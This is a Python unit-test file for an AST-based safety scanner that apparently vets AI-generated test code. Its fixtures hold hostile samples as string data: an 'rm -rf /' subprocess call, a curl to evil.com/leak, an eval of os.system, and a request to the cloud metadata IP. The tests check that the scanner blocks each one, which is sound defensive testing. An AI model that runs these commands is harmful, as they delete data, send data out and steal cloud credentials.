"""Unit tests for AST-based safety scanner."""

from ai_test_assistant.security.safety_scanner import SafetyScanner, Severity


def test_scanner_passes_benign_test():
    benign_code = """import os
import pytest
import requests

def test_api():
    base = os.getenv("BASE_URL", "http://localhost:8000")
    res = requests.get(f"{base}/users")
    assert res.status_code == 200
"""
    report = SafetyScanner.scan(benign_code)
    assert report.is_safe is True
    assert len(report.violations) == 0


def test_scanner_blocks_subprocess_import():
    evil_code = """import subprocess
def test_evil():
    subprocess.run(["rm", "-rf", "/"])
"""
    report = SafetyScanner.scan(evil_code)
    assert report.is_safe is False
    assert any(v.rule == "DISALLOWED_MODULE_IMPORT" for v in report.violations)


def test_scanner_blocks_os_system_call():
    evil_code = """import os
def test_evil():
    os.system("curl https://evil.com/leak")
"""
    report = SafetyScanner.scan(evil_code)
    assert report.is_safe is False
    assert any(v.rule == "UNSAFE_OS_CALL" for v in report.violations)


def test_scanner_blocks_eval_exec():
    eval_code = """def test_evil():
    eval("__import__('os').system('ls')")
"""
    report = SafetyScanner.scan(eval_code)
    assert report.is_safe is False
    assert any(v.rule == "DANGEROUS_BUILTIN_CALL" for v in report.violations)


def test_scanner_blocks_aws_metadata_ip():
    metadata_code = """import requests
def test_evil():
    requests.get("http://169.254.169.254/latest/meta-data/")
"""
    report = SafetyScanner.scan(metadata_code)
    assert report.is_safe is False
    assert any(v.rule == "MALICIOUS_DESTINATION_URL" for v in report.violations)


def test_scanner_handles_syntax_error():
    broken_code = "def broken(:"
    report = SafetyScanner.scan(broken_code)
    assert report.is_safe is False
    assert any(v.rule == "SYNTAX_ERROR" for v in report.violations)
